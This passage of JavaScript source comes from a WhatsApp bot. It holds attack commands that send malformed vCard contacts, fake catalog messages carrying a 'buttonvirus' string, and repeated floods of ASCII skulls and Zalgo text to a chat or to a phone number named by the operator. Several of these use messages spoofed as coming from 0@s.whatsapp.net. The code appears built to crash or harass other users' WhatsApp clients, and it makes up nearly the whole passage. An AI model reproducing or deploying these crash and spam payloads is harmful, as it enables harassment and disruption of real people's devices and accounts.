karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
hisoka.sendContact(m.chat, global.premium, fkontaak)
}
}
break
case 'catalogbug': {
if (!isCreator) return
if (args.length == 0) return freply(`amount?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
const ctlg = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: hisoka.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "99999999999999",
"title": `Faxx! Faraxxx ??ˣ_ˣ CATALOG 🔥➥ ${buttonvirus} ${buttonvirus}`,
"description": `Faxx! Faraxxx ??ˣ_ˣ CATALOG ${buttonvirus} ${buttonvirus}`,
"currencyCode": "IDR",
"footerText": `Faxx! Faraxxx ??ˣ_ˣ CATALOG`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `Faxx! Faraxxx ??`,
"url": "wa.me/6281523940672"
},
"businessOwnerJid": "6281523940672@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ctlg })
hisoka.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
case 'gashello': {            
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)}
            break
case 'tengkorak': {            
          if (!isCreator) return
             teng = `
██▀░░░░░░░░░░░░░▀██
█░░░░░░░░░░░░░░░█
▌░░░░░░░░░░░░░░░▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░████▌░░░▐████░▐
█░▐██▀░░▄░░▀██▌░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
}
            break
case 'tengkorakto': {            
          if (!isCreator) return
             teng = `
██▀░░░░░░░░░░░░░▀██
█░░░░░░░░░░░░░░░█
▌░░░░░░░░░░░░░░░▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░████▌░░░▐████░▐
█░▐██▀░░▄░░▀██▌░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)}
            break
case 'gastengkorak': {            
          if (!isCreator) return
             teng = `
██▀░░░░░░░░░░░░░▀██
█░░░░░░░░░░░░░░░█
▌░░░░░░░░░░░░░░░▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░████▌░░░▐████░▐
█░▐██▀░░▄░░▀██▌░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
case 'santetto': { 
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
